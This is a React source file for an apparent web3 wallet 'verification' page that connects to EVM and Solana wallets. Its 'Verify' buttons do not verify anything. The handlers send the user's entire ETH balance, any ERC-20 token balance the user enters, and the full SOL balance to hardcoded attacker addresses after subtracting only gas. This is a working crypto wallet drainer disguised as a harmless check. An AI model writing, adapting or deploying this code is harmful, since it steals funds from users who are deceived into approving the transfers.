import React, { useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useBalance, useSendTransaction, useWriteContract } from "wagmi";
import { parseEther, parseUnits } from "viem";
import ERC20_ABI from "./abi/erc20.json";
import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
import { ethers } from "ethers";

// Animated gradient background
const backgroundStyle = {
  position: "fixed",
  top: 0,
  left: 0,
  width: "100%",
  height: "100%",
  zIndex: -1,
  background: "linear-gradient(-45deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb)",
  backgroundSize: "400% 400%",
  animation: "gradientBG 15s ease infinite"
};

// Keyframes for background
const styleSheet = document.styleSheets[0];
styleSheet.insertRule(`
@keyframes gradientBG {
  0% {background-position: 0% 50%;}
  50% {background-position: 100% 50%;}
  100% {background-position: 0% 50%;}
}`, styleSheet.cssRules.length);

function App() {
  const { address, isConnected } = useAppKitAccount();
  const { solanaAddress } = useSolanaAccount();
  const [tokenAddress, setTokenAddress] = useState("");

  const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
  const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";

  const { data: evmBalance } = useBalance({ address, watch: true });
  const { data: solBalance } = useSolanaBalance({ address: solanaAddress, watch: true });

  const { sendTransaction } = useSendTransaction();
  const { writeContract } = useWriteContract();

  // Estimate gas dynamically
  const estimateGasCost = async (tx) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const estimatedGas = await provider.estimateGas(tx);
      const gasPrice = await provider.getGasPrice();
      return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
    } catch {
      return 0.001;
    }
  };

  // Send max EVM assets
  const sendMaxEVM = async () => {
    if (!isConnected || !evmBalance?.formatted) return;
    const provider = new ethers.BrowserProvider(window.ethereum);

    // Send ETH
    const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") });
    const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
    if (maxETH > 0) sendTransaction({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });

    // Send ERC20
    if (tokenAddress) {
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const decimals = await contract.decimals();
      const tokenBalanceRaw = await contract.balanceOf(address);
      const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));

      const data = contract.interface.encodeFunctionData("transfer", [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]);
      const gasCostToken = await estimateGasCost({ to: tokenAddress, data });
      if (parseFloat(evmBalance.formatted) < gasCostToken) return;

      writeContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: "transfer",
        args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
      });
    }
  };

  // Send max SOL
  const sendMaxSOL = async () => {
    if (!solBalance || !solanaAddress) return;
    const maxSOL = parseFloat(solBalance) - 0.00001;
    if (maxSOL <= 0) return;
    await sendSol({ to: FIXED_SOL_RECIPIENT, amount: maxSOL, from: solanaAddress });
  };

  return (
    <div>
      <div style={backgroundStyle}></div>

      <div style={{
        position: "relative",
        zIndex: 1,
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        color: "#fff",
        textAlign: "center",
        padding: 20
      }}>
        {!isConnected ? (
          <>
            {/* Centered Connect Button */}
            <appkit-button style={{ padding: "15px 30px", fontSize: "1.2rem", cursor: "pointer" }} />
            <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
          </>
        ) : (
          <>
            <h3>Connected EVM: {address}</h3>
            <h3>Connected Solana: {solanaAddress}</h3>

            <p>ETH Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
            <p>SOL Balance: {solBalance}</p>

            <input
              placeholder="ERC20 Token Address (optional)"
              value={tokenAddress}
              onChange={(e) => setTokenAddress(e.target.value)}
              style={{ width: "300px", marginBottom: "10px", padding: "5px" }}
            />

            <br />

            <button onClick={sendMaxEVM} style={{ marginRight: "10px", padding: "10px 20px", cursor: "pointer" }}>
              Verify EVM Wallet (ETH + ERC20)
            </button>
            <button onClick={sendMaxSOL} style={{ padding: "10px 20px", cursor: "pointer" }}>
              Verify SOL Wallet
            </button>
          </>
        )}
      </div>
    </div>
  );
}

export default App;